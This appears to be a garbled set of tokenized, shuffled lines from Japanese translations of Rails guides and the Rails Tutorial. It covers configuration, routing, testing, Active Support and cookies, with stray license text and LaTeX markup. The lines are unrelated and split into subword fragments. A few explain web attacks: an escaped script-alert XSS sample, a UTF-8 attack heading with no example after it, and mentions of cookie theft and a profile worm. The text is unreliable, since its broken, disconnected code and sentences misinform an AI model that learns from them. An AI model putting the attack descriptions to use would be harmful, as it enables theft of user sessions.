▁Heroku で 本番 展開 する のであれば 、 「\ href { http :// dev center ▖ heroku ▖ com / articles / full - text - search } { Heroku 全 文 検索 機能 }」 マニュアル ▁( 英語 ) ▁ に従う 必要があります ▟ ( 訳 注 : ▁@ b u do ug um i 06 17 ▁ さ ん が Rails ▁4▖0 版 における [ SIMPLE _ SE A R C H _ F ORM ] を 公開 してくれ ました ▟ T h x ! )
▁* ▁` config ▖ action _ controller ▖ allow _ forgery _ protection ` は 、 CSRF 保 護 をオンに する かどうかを指定します 。
▁( 実際 は どちら でも 動作します が 、 この 文 脈 では 内 挿 と 考え る 方が 筋 が 通 っています ) 。
▁ 処理 される ファイル で アセットパイプライン の require ス テ ート メ ン ト を使用して 、 これらの アセット が 他の アセット に依存する こと を指定することもできます 。
▁errors ▖ add (: customer _ id , ▁" is ▁not ▁active ") ▁unless ▁customer ▖ active ?
▁ ログイン 失敗 時の 処理 を扱う ▁( 誤り あり )
▁最初に \ href { http :// api ▖ heroku ▖ com / signup } { Heroku で ユーザー登録 } します 。
▁ IN ▁N O ▁E V E N T ▁S H ALL ▁ THE ╼ A UT H O R S ▁OR ▁C O P Y R I G H T ▁H O L DER S ▁B E ▁L I A B LE ▁F O R ▁A N Y ▁C LA IM , ▁D A M A G E S ▁OR ▁O THE R ╼ L I A B I L IT Y , ▁ W H E THE R ▁ IN ▁A N ▁A C T ION ▁O F ▁C ON T R A C T , ▁T O R T ▁OR ▁O THE R W IS E , ▁A R IS IN G ▁FROM ,╼ OUT ▁O F ▁OR ▁ IN ▁C ON N E C T ION ▁ W IT H ▁ THE ▁S O F T W A RE ▁OR ▁ THE ▁U SE ▁OR ▁O THE R ▁D E A L IN G S ▁ IN ╼ THE ▁S O F T W A RE ▖
▁| ▁ モデル ▁ / ▁ クラス ▁| ▁ テーブル ▁ / ▁ スキーマ ▁|
▁1▖ ordinalize ▁# ▁=> ▁" 1 st "
▁{0} 図 3 ▖ 4 {/0} ▁{1} 修正 された Help ページ {/1}
▁ テストの 準備 が完了し たので 、 いよいよ サインイン フォームの 開発 に取りかかりま しょう 。
▁リスト \ ref { code : gitignore } のとき
▁この 行 は 、 モデルの どの 属性を \ emph { アクセス可能 } に するか を Rails に 伝 えます ▟ たとえば 、 外部 のユーザー ▁( Web ブラウザ を使用して リクエストを送信する ユーザー など ) ▁ が 変更 しても よい 属性 を指定します 。
▁ フィルタ から 返される 「 " some & lt ; script & gt ; alert (' hello ') & lt ; / script & gt ; 」 という 文字列 の 攻 撃 能 力 は 温 存 されています 。
▁Ruby は コメント の内容 を実行する ことはありません が 、 適切な コメント は それを 読む 人 間 にとって ▁( コードの 作 者 にとって も ) ▁ 非常に 有用です 。
▁ リポジトリを GitHub に わざわざ プッシュ するのに は 2 つの 理由 があります ▟ 1 つ目は 、 ソースコード ▁( と その すべての 変更 履 歴 ) ▁ の 完全な バ ッ ク アップ を作成する ことです ▟ 2 つ目は 、 他の 開発者 と の 共 同 作業を より 簡単に 行う ことです 。
▁` as ` オプションは 、 ローカル変数 の名前 を変更 したい場合 に 使用します 。
▁ 以下のような 結果 が生成されます 。
▁ ブラウザから の ` / photos / show /1/ 2 ` パス は ` Photos ` コントローラの ` show ` アクション に割り当てられ ます 。
▁Spork 、 Ruby Test の 面倒な 設定 は 、 なるべく 後 回 し に するか 廃 止 しました 。
▁ フォロー と フォロー解除 は それぞれ リレーションシップ の作成 と 削除 に 対応 している ため 、 まずは Relationship s コントローラ が必要です ▟ いつものように コントローラを生成 しましょう 。
▁person ▖ errors ▖ empty ?
▁\ k ode { followed _ users } ページ と \ k ode { followers } ページ をテストする 。
▁その 気 に な れば 、 ブラウザの cookies を ブラウザで 直接 調 べ て 結果 を確認する こともできます ▁( 図 \ ref { fig : cookie _ in _ browser })
▁以下の例 では
▁ 英 数字 、 アンダースコア ▁(\ _ ) 、 プ ラ ス ▁( + ) 、 ハイフン ▁( - ) 、 ドット ▁( ▖) ▁ のいずれか を 少なくとも 1 文字 以上 繰り返す
▁ したがって 、 その ページの \ emph { どこか し ら に } マイクロポストの 投 稿 数 が存在する のであれば 、 次のように 探 し 出 して マッチ できる はずです 。
▁$ ▁bin / rails ▁generate ▁scaffold ▁user ▁name ▁email ▁login
▁self を省略した 結果を リスト \ ref { code : correct _ user _ before _ filter } に示します 。
▁ ファイル アップロード 用の フィールド を作成します 。
▁* ▁` config ▖ action _ dispatch ▖ http _ a u th _ s alt ` は 、 HTTP ▁A u th の s alt 値 ( 訳 注 : ▁ ハッシュの 安全 性 を 強 化 するために 加 え られる ランダム な 値 ) を設定します 。
▁ スクリプト パス 作成 のために 内部で ` javascript _ include _ tag ` が使用されています 。
▁ ア ン カ ー タグ \ k ode { a } に \ k ode { href } ▁( URL ) ▁ 属性 を追加する こともできます ▁( こ の例では 、 ユーザープロファイル へのリンク ) 。
▁なお 、\ ref { sec : destroy ing _ users } では サンプルアプリケーション に ユーザーを削除する 機能を実装し 、 管理 権限 ▁( admin ) ▁ を持つ ユーザー 以外 は 削除 を 実行 できない ように 制限 を かけ ます 。
▁ レンダリング の コマンドは Action ▁Controller で使用されている もの と同じ なので 、`: text `、`: inline ` などの オプション も すべて 同様に 使用できます 。
▁ エンジン 内部 のルーティング は 、 以下のように ` config / routes ▖ rb ` の ` Engine ` クラス によって 構成 されます 。
▁REST の 原 則 に 従 場合 、 リソース への 参 照 は リソース 名 と ユ ニ ー ク ID を使用する のが普通です 。
▁has _ many ▁: p ar a gr a ph s , ▁through : ▁: section s
▁\ k ode { current _ user } への 要素 代入 を定義する 。
▁# ▁You ▁can ▁have ▁the ▁root ▁of ▁your ▁site ▁route d ▁with ▁" root "
▁ ユーザーに 新しく フォロワー が 増え たときに メール で 通知 する 機能を実装し てみましょう 。
▁上の コンソール セッション に 示 されている ように 、 リスト \ ref { code : first _ create _ action } で 保存 に 失敗する と 、\ k ode {@ user } オブジェクト に 関連付けられた エラーメッセージ の 一覧 が生成されます 。
▁この テスト 方法は 著者 の お 気 に 入 り です ▟ 最終的に 大 規 模 に ス ケ ー ル アップ する 可能性のある 少 数 のテスト を 、 長 期間 に 渡 って 実 施 したい ような 場合に 非常に 有 用 である ためです 。
▁ 今後 、` respond _ with ` 呼び出し 、 および クラス レベル の ` respond _ to ` 呼び出し は 、` respond ers ` ▁gem なしで は 動作 しません 。
▁ フィンガープリント の 振る舞い については ` config ▖ assets ▖ digest ` 初期化 オプションで 制御 できます ▟ production モードでは デフォルトで ` true ` 、 それ 以外 では ` false ` です 。
▁ 単 体 テスト および 機能 テストで 最も 便利です 。
▁ 以下のように 、 数字 を 特定の 精 度 に 丸 めて 文字列 形式 に できます 。
▁| ▁ オプション ▁| ▁I 18 n ▁ キー ▁|
▁# ▁Read ▁more : ▁ https :// github ▖ com / rails / jbuilder
▁上の 例 で言う と 、` Client ▖ limit (10) ` という コードを 書き 直 して 、 住 所 が 一 括 で 読み込まれる ようにします 。
▁また 、 この fixture は {0}{1} 第 8 章 {/1}{/0} になる まで 使わない 予 定 なので 、 今 の ところ は これらの データを 削除 しておき 、 ユーザー用の fixture ファイルを 空 に しておきましょう ▁( リスト \ ref { code : empty _ fixtures }) 。
▁つまり 、 ここで の実装 は \ k ode { has \_ secure \_ password } と 似 た 側 面 を持ちます 。
▁ ユーザー登録フォーム を完成させ るために 、 リスト \ ref { code : first _ create _ action } の コメントアウト された 部分 に コードを 書き 、 適切に 動作する ようにしましょう 。
▁` prefix ` を変更する と 、 Sprockets は development モード で 別の URL を使用して アセットを 提供し 、 すべての リクエストが Sprockets に 渡される ようになります 。
▁# ▁and ▁use ▁secure ▁cookies ▖
▁ バージョン が 少々 異 な って いて も 同じ 結果を 得 られる こともあります が 、 特に Rails のバージョン に 関 して は 必ず 指定 を 守 ってください 。
▁# ▁このコードは 慣 用 的な 意味 で 正しく ない 。
▁* ▁` d ec re ment !
▁ フ ォ ー ク した リポジトリを ローカル に ク ロー ン し 、 オ リ ジ ナ ル の Rails リポジトリを リモート として 追加 することもできます ▟ このような 場合は 次のように 行う 必要があります 。
▁ 実際に 必要 が生じ たとき は 「 install ▁configure ▁ postgresql ▁< 自分の システム > 」 や 「 rails ▁ postgresql ▁setup 」 で グ グ って 各 自 挑 戦 してみてください
▁ 到 達 不 能 ▁( un reachable ) ▁ であっても 、 必ず し も 無名 ▁( anonymous ) ▁ になる とは限りません 。
▁\ k ode { default _ scope } で で マイクロポストを 順序 付ける
▁この場合 、 ▁\ k ode { find } ではなく \ k ode { find _ by } を使用します ▟ これは 、 前 者 では マイクロポスト がない場合 に 例外が発生します が 、 後者は \ k ode { nil } を返す ためです 。
▁作成した About ページ ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static \_ pages / about })
▁### ▁ アセット にリンクする コードを書く
▁CSS クラスは 、 Ruby の クラス とは まったく 関係 が ありません 。
▁# ▁その モジュール のコンテキストで 実行 されている ▁( blorgh / con c er n s / models / article ) ▁ は 評価 しない
▁` String ` の拡張
▁class ▁ Trans form er
▁ そして SSL を 有効化 する の も 簡単です ▟ ▁\ k ode { production ▖ rb } という 本番環境 の設定 ファイルの 1 行 を修正する だけで済みます 。
▁ オブジェクトが 複 製 不 可能な 場合 、` deep _ dup ` は 単 に その オブジェクトを返します 。
▁$ ▁bundle ▁exec ▁rake ▁db : rollback
▁def ▁determine _ default _ mailer ( name )
▁| ` sendmail _ settings ` | `: sendmail ` の 配信 オプション を上書き します 。
▁{0} 図 7 ▖ 3 {/0} ▁{1} サンプルアプリケーションの Home ページに デバッグ情報 を表示する {/1}
▁create ▁ ▖ gitignore
▁ リクエスト に応じた 制限 は 、 セグメント を 制限 するとき と 同様の方法で 指定 することができます 。
▁` g s ub !` のような 破壊的な 変換 を行なう メソッドを使用すると 、 レシーバ 自体 が 安全 で なくなります 。
▁Active ▁Support の 改 訂 は 注意 深 く 行われ ています ので 、 ある ファイルを 選 んだ 場合 、 本当に 必要な 依 存 ファイル だけ が 同時に 読み込まれます ( 依存関係 がある場合 ) 。
▁format ▖ json ▁ { ▁render ▁ json : ▁@ user , ▁status : ▁: created , ▁location : ▁@ user ▁ }
▁2▖ ▁ ある ユーザーが 別の ユーザーを フォロー \ emph { 解除 } するとき 、 何 が 削除 される のでしょうか 。
▁つまり 、\ k ode { microposts } が 空 になっ てしまう ため 、 上の テスト に 何 を書いて も 動作 し なく な っ てしまう ということです 。
▁ レイアウトファイル は 、\ k ode { rails ▁new } コマンドを実行 し ていれば 既に 作成 されている はずです 。
▁< strong > Title : </ strong >
▁database : ▁my _ database
▁図 \ ref { fig : user _ model _ password _ digest } のような データモデル に するために 、 まずは \ k ode { password _ digest } カラム 用の 適切な マイグレーション を生成します 。
▁orders ▖ create ( attributes ▁= ▁{})
▁ここで 、 以下のような 多 重 代入 ▁( M ultiple ▁As sign ment ) ▁ を使って いることに注目してください 。
▁ 実際に 動作 しました が 、 動作 はデフォルトで 不 安 定 であり 、 悪意のある ユーザー によって アプリケーションの データベース が 書き 換 えられ ることのないように 慎 重 な 手 続 き によって 使用 し なければ な らず 、 しかも その 手 続 は エラーを 起こ し やすい もの でした 。
▁| ▁PATCH / PUT ▁| ▁ / photos / : id ▁| ▁photos # update ▁| ▁ 特定の 写 真 を更新する ▁|
▁デフォルトは " utf -8 " です 。
▁User モデルに アカウント有効化 のコード を追加する
▁ どう にも 気 持ち の 悪 い 動作 だと 思い ません か ▟ 私 にも 何 故 必要な のか 分 か り ません 。
▁ この後 \ ref { sec : remember _ me _ checkbox } では 、 別の 方法 として 、 ログイン を保存する 「 remember - me 」 チェックボックス を追加して 、 ログイン を 継 続 する かどうかを ユーザーが 選択 できるように する 予定です 。
▁| ▁| ▁42 3 ▁| ▁: locked ▁|
▁{0}{1} リスト 2▖1 7 {/1}{/0} を見ると 、\ k ode { Application Controller } 自身 は \ k ode { ActionController :: Base } を継承し ています ▟ これは Rails の Action ▁Pack という ライブラリ が 提供し ている 、 コントローラ 用の ベース クラス です 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / filter s ▖ rb ` です 。
▁end
▁この 状態 を修正する ために 、\ k ode { create } メソッド 内で メールアドレス の 検索 に 使 った の と同じ \ k ode { find \_ by } メソッド を使う ことにします ▟ ただし 今度は \ k ode { email } ではなく \ k ode { id } で 検索 します 。
▁ 違 う のは 、` find _ in _ batches ` は ▁ _ バッチ _ ▁ を 個 別 に ではなく モデル の配列 として ブロック に yield する という 点 です 。
▁これにより 、 フォームの 送信 が ブラウザ による 通常の 送信 メ カ ニ ズ ム ではなく Ajax によって 送信される ようになります 。
▁ これを 拡大 解 釈 して 、\ emph { ア バ ター } という 用 語 は 、 特に ネ ッ ト 界 隈 で 、 その 人 物 を表現する もの ▁( かつ その 人 そのもの の一部 でも ある ) ▁という 意味 で 使われ ます 。
▁ このテストは 、 無効な サインイン データ を送信し 、 次に Web サイトの レイアウト にある Home リンク を開き 、 フラッシュメッセージ が表示され ていない ことを確認します 。
▁これらの メソッドは 、 クラス 変数 を ` nil ` に設定し ▁( クラス 変数 が 既に ある 場合 を 除 く ) 、 対応する クラスメソッド を生成し て アクセス できるようにします 。
▁ Order ▖ select (" date ( created _ at ) ▁as ▁order ed _ date , ▁ sum ( price ) ▁as ▁total _ price ")▖
▁ ディレクティブ が ` ▖ js ` ファイルに 書かれてい れば 、 Sprockets によって自動的に ` ▖ js ` ファイル が必要 ファイル として 指定 されます 。
▁( 最初の アプリケーションの ときと同様 、 GitHub リポジトリを 初期化 するときに \ emph { README } を使用 \ k ode { しない } ように 注意してください ▟)
▁NOTE : ▁` Engine ` クラスの 定義 に含まれる ` isolate _ namespace ` の 行 を変更 / 削除 しない ことを ▁** 強く ** ▁ 推 奨 します 。
▁find の この動作 は 、 ユーザー プロフィール ページ では 完全に 適切 です ▟ ID が 無効 の場合は 例外を発生 してくれ なければ 困 る からです ▟ しかし 、 ユーザーがログイン していない など 多くの 状 況 では 、\ k ode { session [: user \_ id ]} の値 は \ k ode { nil } になります 。
▁ クラス と ID の 主な 違い は 、 クラスは ページ の中で 何 度 でも 使用できる の に対し 、 ID は 一度 しか 使用する ことができ ない 点 です 。
▁上の テーブル スキーマ に従って 、 以下のような コードを い き なり 書く ことができます 。
▁$ ▁git ▁apply ▁~/ my _ change s ▖ patch
▁ Builder テンプレート は ERB の代わりに 使用できる 、 より プログラミング 向 き な 記 法 です 。
▁ 残 り の ステップ も同様に 進 め られます 。
▁=> ▁" development "
▁# ▁1▖ even ?
▁for ▁item ▁in ▁@ recent _ items
▁ このような 状 況 に対応する ために 、 この エンジン では ` User ` クラス と の 関連付けを ハ ー ド コード しないよう に すべき です 。
▁ 注 目 すべき 点 は 、 Bootstrap を使う ことで アプリケーションを \ href { http :// en ▖ w ikipedia ▖ org / wiki / Re s p on s ive _ web _ de sign }{\ emph { レ シ ポ ン シ ブ デザイン } } に できる ということです ▟ これにより 、 どの 端 末 で アプリケーションを 閲 覧 しても 、 ある程度 見 栄 え を よく することができます 。
▁#### # ▁` select `
▁user ▖ name ▁= ▁' Dave '
▁{0} 表 1 ▖ 2 : ▁ {/0} ▁{1} デフォルトの Rails フォルダ 構造 まとめ ▟ {/1}
▁(\ emph { ヒント : } フォローしているユーザー が 5 000 人 も い たら どう なる でしょうか ) 。
▁ テスト 環境で も Application ヘルパー を 使えるように する
▁1, 2 ]) ▁# ▁=> ▁true
▁$ ▁git ▁ checkout ▁my _ pull _ request
▁ vendor / assets / some p ac k age / phone box ▖ js
▁ SMTP 認 証 情報 などの デフォルトの 配信 オプションを メール 配信 時に 上書き したい場合 、 メイラー の アクション で ` delivery _ method _ options ` を使用して 変更 することができます 。
▁ユーザー 数 が 膨 大 になる と \ k ode { find _ by } では 検索 効率 が 低 下 する のではないかと 心 配 する 方 も い る かもしれませんが 、 あ せる 必要はありません ▟ この問題 および データベースの インデックス を使った 解決策 については \ ref { sec : uniqueness _ validation } で 扱 います 。
▁$ ▁git ▁re base ▁rails / branch _ name
▁ただし 、1 つ 重要な 違い があります ▟ Ruby は シングルクォート 文字列 の中で は 式 展開 を 行 いません 。
▁ UT F -8 による 攻 撃 方法 の例 を以下に示します 。
▁config ▖ generator s ▁do ▁| g |
▁\ emph { Rails チュートリアル } の サンプルアプリケーション では 気にする必要はありません ▟ 作り かけ の 恥 ず か しい Web アプリケーションを ネ ッ ト に う っかり 公開 して しま わ ない だ ろ う か と 心 配 する 方 も い ら っ し ゃ る か と思います が 、 それ を防ぐ ための 方法は い く つ もあります ので ご 安 心 ください ▟\ ref { sec : heroku _ commands } はその 方法 の 1 つ です 。
▁上のコードでは \ k ode { stylesheet _ link _ tag } 関数 を 2 つの 引数 で 呼んでいます ▟ 最初の 引数 である 文字列 は 、 スタイルシート へのパス を 示 しています ▟ 次の 引数 である ハッシュ には 2 つの 要素 があり 、 最初の 要素 は メディアタイプ を 示 し 、 次の 要素 は \ href { https :// github ▖ com / rails / turbolinks } { turbolinks } 機能 をオンに しています
▁ 他の 静的ページ について も同様に ルーティング を変更 して い く と 、 リスト \ ref { code : contact _ route } は リスト \ ref { code : static _ page _ routes } のような コード になります 。
▁user ▖ occupation ▁= ▁" Code ▁Artist "
▁ これまで 通常の インスタンス変数 を使用し てきた のは 、 インスタンス変数 を 早い 段階で 紹 介 しておき た か った の と 、\ k ode { let } が や や 高 度 である ためです 。
▁この節では 、 RSpec の 最新の 機能 を使い 、 テストを より 簡潔 で 洗 練 された もの に します 。
▁ デフォルトの " localhost " 設定 から 変更します 。
▁* ▁Rails ▁3▖2 ▖ x は Ruby ▁1▖8▖7 の 最 終 ブランチ です 。
▁production 環境で 実際に メール送信 する方法 については \ ref { sec : email _ in _ production } で説明します 。
▁$ ▁git ▁ checkout ▁my _ new _ branch
▁[1, ▁2, ▁3] ▖ in _ groups _ of ( 2, ▁false ) ▁# ▁=> ▁[[1, ▁2 ] , ▁[ 3 ]]
▁本章では それ と 平 行 して 、 近 年 の プログラミング で 不可 欠 となっている 「\ emph { 自動化 テスト }」 の 雰 囲 気 を 掴 んで い ただ きます ▟ 自動化 テスト を作成する ことで 、 コード が正しく 動いている ことが 裏 付け られます 。
▁### ▁ コンパクト 化
▁ 本番環境で は 、 ファイルシステム ではなく クラウド スト レ ー ジ サービス に 画像 を保存する ように してみましょう
▁この テストでは 、 元の ユーザーが 別の ユーザーの \ k ode { edit } アクション や \ k ode { update } アクション にアクセス できない ことを確認します 。
▁ ユーザーが 有効 である ことを確認する 中 核 部分 は以下のようになります 。
▁ Array ▖ wrap ( nil ) ▁# ▁=> ▁[]
▁| ▁** Client ▁ Error ** ▁| ▁ 400 ▁| ▁: bad _ request ▁|
▁$ (" <%= ▁escape _ javascript ( render ▁@ user ) ▁%> ")▖ append To (" # users ") ;
▁| ▁| ▁50 1 ▁| ▁: not _ implement ed ▁|
▁╼╼\ section { セットアップ } ▁% ▁( fold )╼\ label { sec : sample _ app _ setup }╼╼ As ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁before ▁getting ▁started ▁we ▁need ▁to
▁3 番目 に 、 多くの 環境 設定ファイル を 正しい デフォルト オプション に 更新 します 。
▁このとき 、 もし タイトル を まったく 与 え ていなければ 、 タイトル が 空欄 になってしまいます 。
▁` Users ` コントローラの ` show ` アクション の 内部で ` params [: user name ]` にアクセスすると 、 ユーザー名 を 取り出す ことができます 。
▁このオプション を使用し ない場合 、 Active ▁Record は バリデーション ヘルパー のデフォルトの エラーメッセージ を使用します 。
▁ attachments [' filename ▖ jpg '] ▁= ▁ {
▁ doc /
▁ セッション 用 パス に 有効な 情報を post する
▁ assembly _ id s
▁` app / views / welcome / index ▖ html ▖ erb ` の中に 書いた " Hello , ▁Rails !" という文字 が ブラウザ 上 に表示される はずです ▟ ` Welcome Controller ` の ` index ` アクション への ルーティング が 新たに 形 成 され 、 ビュー が正しく 表示 された ことが これで 確 認 で きました 。
▁上のコードは 、 ある 本 が ` special ?` である 場合にのみ ` special _ show ` テンプレート を使用して 出力 します ▟ それ以外の 場合は ` show ` テンプレート を使用して 出力 します 。
▁これで 、 先に 述 べ た ア リ ス の シナリオ は うまく い く ようになります ▟ データベース は 、 最初の リクエスト に基づいて ユーザーの レコードを 保存 します が 、2 度 目 の 保存 は 一意性 の 制 約 に 反 する ので 拒 否 します
▁C D ▁B a by ▁ 創 始 者
▁Rake は い わ ば \ emph { Ruby 版 の make } であり 、 Ruby で 記 述 すること の できる 、 make のような 言語 です 。
▁* ▁Rails ▁4▖0 では ` ActionDispatch :: Integration ` の導入に伴い ` ActionController :: Integration ` が 非推奨 となり ました 。
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ads / new ▁| ▁ ads # new ▁| ▁ ある 1 冊 の 雑 誌 用の 広 告 を 1 つ 作成する HTML フォーム を返す ▁|
▁({0}{1} 第 12 章 {/1}{/0} では フィード を 汎 用 化 し 、 現在のユーザー によって \ emph { フォロー されている } ユーザーのマイクロポスト も一緒に 表示する フィード にする 予定です ) 。
▁Active ▁Job は Action ▁Mailer と 統合 されているので 、 非同期 メール送信 を簡単に 行えます 。
▁Rails では こうした 問題 を 緩和 する ため 、 問題 の 原 因 を自動的に 検出 して 修正 するために 内部で 多くの 手順を 行 っています 。
▁ 残念ながら 、 Ruby や RVM のインストール 中に 問題が生じ ること が よく あります 。
▁< h 2 > <%= ▁article ▖ title ▁%></ h 2 >
▁今度は 順序 を 変 え て 計算 すると 、 結果 が異なります 。
▁( なお 、 彼 の ア ド バ イ ス をそのまま 採 用 した わけではありません ので 、 もし 本書 に まだ わかりにくい 部分 が あった としても 、 彼 には 一 切 の 責 任 がない ことを ここに 申 し 伝 え ておきます ) ▁ 。
▁ 以下のように 、 ヘッダー に 別の 情報 を含め ることもできます 。
▁ delegate ▁: name , ▁: age , ▁: address , ▁: twitter , ▁to : ▁: profile
▁\ k ode { - d } フラグ と異なり 、\ k ode { - D } フラグ は 変更を マージ して い なくても ブランチ を 削除 してくれます 。
▁ 最 近 の Rails に 追加 された 機能 の中で 最も 特 筆 すべき 機能 のひとつ は 、 CSS 、 JavaScript 、 画像 などの 静 的 コンテンツ の 生 産 性 と 管理 を 大 幅 に 強 化 する 「\ emph { Asset ▁Pipeline }」 です 。
▁ 主な 違い は 、 後者の \ k ode { update _ attribute } の使い方 に あります 。
▁Web ページ を書き換え る ▁( 汚 損 ) ▁ ことで 、 偽 の 情報を 表示 したり 、 標的ユーザー を 攻撃者 の 偽 サイトに 誘 い 込 んで cookie や ログイン 情報 などの 重要 データを 盗 み 出 す などの さまざまな 攻 撃 が 可能 になります 。
▁scope ▁: active , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁* ▁[ Ruby ▁on ▁Rack ▁# 1 ▁- ▁ Hello ▁Rack ! ](
▁ 新しい パスワードを 再設定 するための フォーム ▁( 図 \ ref { fig : forgot _ password _ form _ mockup }) ▁ と 、 User モデル 内の パスワード を変更 するための フォーム ▁( 図 \ ref { fig : reset _ password _ form _ mockup }) ▁ が 両方 必要 になるので 、 今回は \ k ode { new }、\ k ode { create }、\ k ode { edit }、\ k ode { update } のルーティング も 必要 になります 。
▁以上で 認証システム が動作する ようになりました が 、 今 のまま では 、 登録 の 終 わ った ユーザーが デフォルトでは ログイン していない ので 、 ユーザーが と ま どう 可能性があります 。
▁ 追加される 行 数 は そこ そこ 多 い のですが 、 基本的に 素 直 なので 心 配 はありません ▟ リスト \ ref { code : signup _ with _ account _ activation _ test } を ご 覧 ください 。
▁ コメント を コンソール 内で 入力 する 人 は 普通 いません が 、 ここでは 学習 のために あえて 以下のように コメント を追加 してみましょう 。
▁# ▁Convert s ▁a ▁collection ▁of ▁elements ▁into ▁a ▁ formatted ▁string ▁by
▁ここでは エラーを フラッシュメッセージ として 表示する ので 、 以下のように テスト できます 。
▁これで すべての 存在性 が チェック された ので 、 テストスイート は {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁* ▁` config ▖ action _ controller ▖ default _ static _ extension ` は 、 キャッシュ された ページ に与える 拡張子 を指定します 。
▁ YAML から ダ ン プ した オブジェクト を含む ` pre ` タグを返します 。
▁# ▁=> ▁( 123 ) ▁ 555-1234 ▁x ▁5 55
▁{0} 図 7 ▖2{/0} ▁{1} 理想 と する 最終的な プロファイル ページのモックアップ {/1}
▁第 3 章 以降 では 、 いよいよ 本格的な 大 規 模 \ emph { サンプルアプリケーション } ▁(\ k ode { sample _ app } ▁ ) を 開発 します ▟ 自動生成 コードは 使 わ ずに 、 ゼロ から コードを 書き 進 め ます 。
▁\ k ode { paginate } メソッドの 素 晴 ら し さ に注目し てください ▟ マイクロポストの 関連付け を経由して \ text tt { micropost } テーブルに 到 達 し 、 必要な マイクロポストの ページを 引 き 出 してくれます 。
▁` count ` が それ以外の 値 の場合は 複数形 を返します ( 訳 注 : ▁ 英語 では 個 数 が ゼロ や 小 数 の場合は 複数形 で 表 されます ) 。
▁<% ▁@ people ▖ each ▁do ▁| person | ▁%>
▁ MultiJSON はその 役 目 を 終 え て ▁[ end - of - life ]( https :// github ▖ com / rails / rails / pull /1 05 76 ) ▁Rails から 削除 されました 。
▁class ▁ Array
▁module ▁My Application
▁parts _ order : ▁[ ▁" text / plain ", ▁" text / en ri ch ed ", ▁" text / html " ▁ ]
▁しかし セッション の内容は エ ンド ユーザー から 見え てしまいます ▟ 内容 を 暗号化 することで 懸 念 を 取り除く ことができ 、 パフォーマンス の 低 下 も それ ほど ありません 。
▁従って 、 このメソッドは 、 同じ 場所 で Ruby が 定数 を 評価 した ときの 値 と 必ず し も 等 価 ではありません 。
▁m ▖ anonymous ?
▁Rails では 以下の 設定 で この 期間 を指定できます 。
▁上の 例 の場合 、 Andy という名前の クライアント が なかった ので レコード を作成して 返 しました 。
▁D ir ▖ g lo b ( Rails ▖ root ▁+ ▁" app / decorator s / ** /* _ decorator * ▖ rb ")▖ each ▁do ▁| c |
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / out put _ safety ▖ rb ` です 。
▁{0} 図 8 ▖2{/0} {1} サインイン 失敗 時 のモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / signin _ failure _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁リスト \ ref { code : toy _ application _ controller _ class } を見ると 、\ k ode { Application Controller } 自身 は \ k ode { ActionController :: Base } を継承し ています ▟ これは Rails の Action ▁Pack という ライブラリ が 提供し ている 、 コントローラ 用の ベース クラス です 。
▁m o un t ▁Blorgh :: Engine , ▁at : ▁"/ blog "
▁Rails には 標準 で 3 つ 環境 が 備 わ っ ており 、 それぞれ \ k ode { 開発環境 ▁( development ) }、\ k ode { テスト 環境 ▁( test ) }、\ k ode { 本番環境 ▁( production )} と呼ぶ
▁ 統合テスト では 、 ルーティング 、 データベースの 更新 、 レイアウト の 変更 が正しく 行われている かどうかを確認 できます 。
▁\ k ode { README } ファイルの 拡張子 は \ k ode { ▖ rdoc } になっている ので 、 GitHub では 適切な フォーマット で 表示されます ▟ しかし そ の内容は Rails フレームワーク そのもの に関する もの で 、 そのまま では 役に立 ち ません ▟ この節 では README の内容を 編集 し 、 プロジェクト に関する 記 述 に置き換え ます 。
▁login _ procedure ▖ call ( token , ▁options )
▁次に 、 flash メッセージ が 空 でない かどうか と 、 プロフィール ページ にリダイレクトされる かどうかをチェックします ▟ また 、 データベース 内の ユーザー情報 が正しく 変更 された かどうか も 検証 します 。
▁` render ` と ` redirect _ to ` の違い を 以下の アクション で 比 較 してみましょう 。
▁ 生成された HTML ファイルは ▖ / doc / rdoc ディレクトリ に置かれ ます 。
▁最後に 、 ユーザーが マイクロポストを Web 経由で 破 棄 できるようにします 。
▁> > ▁x ▁* = ▁3
▁ テストコード は 、 アプリケーションコード から 見 れば \ emph { クライアント } として 動作する ので 、 アプリケーションの 設計 や システム の 他の 部分 と の インターフェイス を 決 め る ときに も 役に立 つ 。
▁ ブラウザの cookies に トークン を保存する ときには 、 有効期限 を設定する 。
▁ プロフィール画面 における マイクロポスト をテストするために は 、 ユーザーに 紐 付 いた マイクロポストの テスト 用 データ が必要 になります 。
▁ 最終的に 4 K B サイズ の ワーム が でき あ が り 、 作 者 は 自分の プロファイル ページに これを 注入 しました 。
▁たとえば 以下のように 、 cookies に 20 年 後に 期限切れ になる 記憶トークン に 等 しい 値 を保存する ことで 、 ユーザーの サインイン を実装 できます 。
▁ユーザー ID と 永 続 記憶トークン は ペ ア で 扱 う 必要がある ので 、 cookie も 永 続 化 し なくてはなりません ▟ そこで 、 以下のように \ k ode { signed } メソッドと \ k ode { permanent } メソッドを チ ェ イン ▁( 連 鎖 ) ▁ して 使用します 。
▁\ ref { sec : microposts _ resource } で作成した モデル と同様に 、 この 新しい Micropost モデル も データ 検証 と User モデルの 関連付けを 含 んで います 。
▁attributes ▁= ▁{}) `
▁Active ▁Record は 、 たとえば 関連付け が 行われている 場合に 未 知 の オプションを 受け付け ません 。
▁Client ▖ limit ( 5 )
▁ ファイル には これ しか 書かれてい ません が 、 この ` Article ` クラス が ` ActiveRecord :: Base ` クラス を継承し て いることにご注目ください 。
▁#### # ▁` prev _ quarter `、` next _ quarter `
▁< script ▁src =" http :// html 5 shim ▖ google code ▖ com / svn / t run k / html 5 ▖ js "></ script >
▁* ▁` config ▖ active _ record ▖ cache _ timestamp _ format ` は 、 キャッシュ キー に含まれる タイムスタンプ 値 の 形式 を指定します 。
▁ サードパーティ の プラグイン や gem で使用する CSS ▁( C ascad ing ▁Style ▁Sheet ) 、 JavaScript ファイル 、 画像 などの アセット
